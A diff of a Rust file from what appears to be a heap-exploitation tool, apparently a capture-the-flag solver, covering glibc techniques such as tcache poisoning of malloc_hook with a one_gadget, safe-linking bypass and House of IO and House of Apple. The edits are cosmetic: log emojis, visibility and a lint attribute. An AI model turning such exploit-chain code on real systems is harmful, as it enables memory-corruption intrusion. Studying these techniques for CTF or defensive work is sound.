@@ -4,8 +4,6 @@
 // Modern heap exploitation: safe-linking bypass, tcache key validation bypass,
 // House of IO, House of Apple, largebin attack, FILE structure exploitation
 
-#![allow(clippy::upper_case_acronyms)]
-
 use serde::{Deserialize, Serialize};
 
 /// Heap chunk metadata structure (glibc malloc)
@@ -251,7 +249,7 @@ impl HeapExploit {
         let mut chain = self.tcache_poison(malloc_hook, 0x60);
 
         // Second allocation will be from tcache (fills tcache)
-        chain.extend_from_slice(&[b'C'; 0x60]);
+        chain.extend_from_slice(&vec![b'C'; 0x60]);
 
         // Third allocation will be at malloc_hook - overwrite with one_gadget
         chain.extend_from_slice(&one_gadget.to_le_bytes());
@@ -499,7 +497,7 @@ impl ModernHeapExploit {
 
     pub fn solve(&self) -> Result<HeapExploitResult, String> {
         println!(
-            "[HEAP]  Generating exploit for technique: {:?}",
+            "[HEAP] 🔧 Generating exploit for technique: {:?}",
             self.technique
         );
 
@@ -574,7 +572,7 @@ impl ModernHeapExploit {
     }
 
     fn solve_tcache_key_bypass(&self) -> Result<HeapExploitResult, String> {
-        println!("[HEAP]  Solving: Tcache Key Validation Bypass");
+        println!("[HEAP] 🔑 Solving: Tcache Key Validation Bypass");
 
         if !self.glibc_version.has_tcache_key() {
             return Err("Tcache key validation not present in this glibc version".to_string());
@@ -635,7 +633,7 @@ impl ModernHeapExploit {
     }
 
     fn solve_house_of_io(&self) -> Result<HeapExploitResult, String> {
-        println!("[HEAP]  Solving: House of IO (FILE Structure Exploitation)");
+        println!("[HEAP] 📁 Solving: House of IO (FILE Structure Exploitation)");
 
         let libc_base = self.libc_base.ok_or("Libc base required for House of IO")?;
 
@@ -682,7 +680,7 @@ impl ModernHeapExploit {
     }
 
     fn solve_house_of_apple(&self) -> Result<HeapExploitResult, String> {
-        println!("[HEAP]  Solving: House of Apple (Modern Heap Feng Shui)");
+        println!("[HEAP] 🍎 Solving: House of Apple (Modern Heap Feng Shui)");
 
         let libc_base = self
             .libc_base
@@ -814,7 +812,7 @@ impl ModernHeapExploit {
         ptr ^ (pos >> 12)
     }
 
-    pub fn safe_linking_demangle(&self, pos: u64, mangled: u64) -> u64 {
+    fn safe_linking_demangle(&self, pos: u64, mangled: u64) -> u64 {
         mangled ^ (pos >> 12)
     }
 
